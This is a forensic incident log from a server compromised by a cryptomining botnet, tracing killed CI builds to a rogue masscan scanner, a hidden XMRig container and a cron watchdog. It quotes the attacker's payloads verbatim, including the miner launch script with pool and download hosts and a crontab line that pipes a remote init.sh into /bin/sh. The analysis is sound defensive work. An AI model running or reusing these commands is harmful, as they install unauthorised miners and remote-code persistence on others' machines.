# Forensic Analysis & Technical Investigation Logs: Attack-1

This document preserves the raw forensic commands, output captures, and technical analysis used during the triage and eradication of the `r2sh` botnet incident.

---

## 1. Initial Diagnostic: Signal 137 Investigation

During CI/CD execution via GitHub Actions (`appleboy/ssh-action`), `prisma generate` failed instantaneously:

```text
deploy err: $ prisma generate
deploy err: Killed
deploy out: /home/***/exec-d/packages/db:
deploy out: [ERR_PNPM_RECURSIVE_RUN_FIRST_FAIL] @exec-d/db@ db:generate: `prisma generate`
deploy out: Exit status 137
```

### Checking Kernel OOM Killer:
```bash
sudo dmesg -T | grep -i oom
sudo journalctl -k --since "2026-10-02 05:01:00" --until "2026-10-02 05:02:00"
# Output: -- No entries --
```
*Conclusion*: The Linux kernel OOM-killer was NOT invoked. The process was killed by a userspace signal.

### System Call Tracing via `strace`:
Running `strace -f -e trace=process,signal npx prisma generate` captured the exact moment of signal delivery:

```text
[pid 1137997] +++ killed by SIGKILL +++
[pid 1137996] +++ killed by SIGKILL +++
[pid 1137986] +++ killed by SIGKILL +++
[pid 1137985] <... wait4 resumed>[{WIFSIGNALED(s) && WTERMSIG(s) == SIGKILL}], 0, NULL) = 1137986
[pid 1137985] --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_KILLED, si_pid=1137986, si_uid=1001, si_status=SIGKILL} ---
Killed
```

---

## 2. Process Tree & Rogue Session Discovery

Running `ps aux` revealed anomalous processes executing under `root` and `ubuntu`:

```text
USER       PID  %CPU %MEM     VSZ    RSS TTY      STAT START   TIME COMMAND
root   1134752  10.8  0.5 1293800  66652 ?        Sl   05:00   0:38 /usr/bin/python3 ./worker.py /tmp/work.json
root   1134758   3.4  0.3  223964  45656 ?        Sl   05:00   0:12 /usr/local/bin/masscan -iL /tmp/tmpji3u6aqz.txt -p 80,443,3000 --rate 1250 -oG - --wait 3 --interface enp0s6 --router-ip 10.0.0.1 --adapter-ip 10.0.0.183
ubuntu 1078750   0.0  0.0  163356   1756 ?        Sl   03:26   0:00 redis-server redis-s
ubuntu 1113462   0.0  0.0    2396   1632 ?        S    04:31   0:00 /bin/sh ./entrypoint.sh
```

### Inspecting CGroup & Systemd Session:
```bash
systemctl status 1134752
```

**Output:**
```text
● session-9969.scope - Session 9969 of User ubuntu
     Loaded: loaded (/run/systemd/transient/session-9969.scope; transient)
     Active: active (abandoned) since Fri 2026-10-02 05:00:17 UTC
      Tasks: 31
     Memory: 60.2M
     CGroup: /user.slice/user-1001.slice/session-9969.scope
             └─1134752 /usr/bin/python3 ./worker.py /tmp/work.json
```

### Reviewing SSH Authentication Logs:
```text
Oct 02 05:00:17 portfolio-exec-d sshd[1134736]: Accepted publickey for ubuntu from 103.230.144.104 port 48318 ssh2: ED25519 SHA256:6s3fMeTdexgntWxD3q82hLmLWI3WfJPjbjPHEZAPfI8
Oct 02 05:00:18 portfolio-exec-d sudo[1134737]: ubuntu : PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/bash -lc 'mv -f /tmp/work-node-744.json /tmp/work.json; cd /opt/scanner; NODE_LABEL=node-744 nohup python3 ./worker.py /tmp/work.json...'
```

---

## 3. Docker Container Forensics (`sys-helper`)

Inspecting Docker containers via `docker ps -a` exposed an unauthorized container:

```text
CONTAINER ID   IMAGE                       COMMAND                   CREATED        STATUS
c93928355697   eclipse-temurin:21-alpine   "/bin/sh -c '\nW='47G…"   12 hours ago   Up 16 seconds (sys-helper)
```

### Inspecting Container Configuration:
```bash
docker inspect sys-helper | grep -E '"Args"|"Cmd"' -A 20
```

Extracted payload command:
```sh
W='47Gju616BichSCU9PzyZGCHASkSwo7rH1N9v7Q5SqvFSjcFjrTXbJMqEzgHDinJFtEPL7o3n9nqMuEr6KvrYCaqeGAbdDXR'
POOL='85.215.219.126:443'
A=$(uname -m 2>/dev/null)
...
U1='http://158.220.105.179:8765/xmrig-6.25.0-linux-static-arm64.tar.gz'
U2='http://138.197.174.121:8765/xmrig-6.25.0-linux-static-arm64.tar.gz'
...
exec "$BIN" -o "$POOL" -u "$W" -p x --donate-level=0 --keepalive $RX $TH $HINT
```

---

## 4. Crontab Persistence & Watchdog Mechanism

Checking the `ubuntu` user crontab (`crontab -l`) revealed the persistence mechanism:

```bash
* * * * * /bin/sh -c '{ kill -0 1078750 2>/dev/null || grep -q 0100007F:A71C /proc/net/tcp 2>/dev/null; } && exit 0; (wget -qO- http://195.178.110.29/d/432936b3a0439572/init.sh || curl -sL http://195.178.110.29/d/432936b3a0439572/init.sh) | /bin/sh' > /dev/null 2>&1
```

*Function*:
1. Checks if PID `1078750` (rogue redis-server) is alive, or checks `/proc/net/tcp` for hex `0100007F:A71C` (`127.0.0.1:42780`).
2. If inactive, downloads `http://195.178.110.29/d/432936b3a0439572/init.sh` and pipes directly to `/bin/sh`.
3. The script terminates competing CPU processes (causing builds to receive `SIGKILL`).
